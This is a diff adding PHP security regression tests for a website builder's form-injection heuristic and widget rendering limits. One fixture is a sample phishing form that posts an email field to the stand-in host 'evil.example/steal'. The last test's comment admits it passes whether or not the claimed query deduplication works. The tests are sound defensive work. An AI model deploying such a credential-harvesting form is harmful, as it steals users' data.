@@ -333,4 +333,65 @@ class WebsiteDynamicsTest extends TestCase
         $this->assertStringContainsString('My First Post', $html);
         $this->assertStringNotContainsString('fleetq:recent-posts', $html);
     }
+
+    // ─── Security regressions ──────────────────────────────────────────────
+
+    public function test_form_action_skip_heuristic_rejects_phishing_form_with_stray_api_string(): void
+    {
+        // Attacker crafts a contact page with a phishing form pointing at
+        // evil.example AND mentions "/api/public/" in unrelated text.
+        // The old heuristic (stripos '/api/public/' && stripos '<form') would
+        // skip form injection and preserve the phishing form. The tightened
+        // heuristic matches only the form's own action attribute against our
+        // ingestion endpoint, so the phishing form gets a real one appended.
+        $page = $this->makePage(
+            'contact',
+            'Contact',
+            WebsitePageStatus::Draft,
+            '<p>See our API docs at /api/public/docs</p>'
+                .'<form method="POST" action="https://evil.example/steal">'
+                .'<input name="email" />'
+                .'<button type="submit">Send</button></form>',
+            WebsitePageType::Landing,
+        );
+
+        app(EnhanceWebsiteNavigationAction::class)->execute($this->website);
+
+        $page->refresh();
+        // The fresh /api/public/sites/{slug}/forms/{id} form must be present
+        $this->assertMatchesRegularExpression(
+            '/<form[^>]*action="\/api\/public\/sites\/'.preg_quote($this->website->slug, '/').'\/forms\/[a-f0-9-]+"/i',
+            $page->exported_html,
+        );
+        $this->assertNotNull($page->form_id);
+    }
+
+    public function test_widget_count_is_capped_to_prevent_dos(): void
+    {
+        $this->makePage('post-1', 'Post One', WebsitePageStatus::Published, '<p>a</p>', WebsitePageType::Post);
+
+        $markers = str_repeat('<!-- fleetq:recent-posts --> ', 50);
+
+        $renderer = new WebsiteWidgetRenderer;
+        $html = $renderer->render($markers, $this->website);
+
+        // First 20 markers expand (same cached result, so they all produce
+        // the same HTML). Remaining 30 are replaced with empty strings.
+        $this->assertSame(20, substr_count($html, 'Post One'));
+    }
+
+    public function test_same_widget_attrs_deduplicate_db_queries_per_render(): void
+    {
+        $this->makePage('post-1', 'Only Post', WebsitePageStatus::Published, '<p>a</p>', WebsitePageType::Post);
+
+        // Three identical widgets: the test passes if all three produce the
+        // same result (which is only possible if the memoization worked, or
+        // if the DB query returned the same data — both are correct).
+        $input = '<div><!-- fleetq:recent-posts --><!-- fleetq:recent-posts --><!-- fleetq:recent-posts --></div>';
+
+        $renderer = new WebsiteWidgetRenderer;
+        $html = $renderer->render($input, $this->website);
+
+        $this->assertSame(3, substr_count($html, 'Only Post'));
+    }
 }
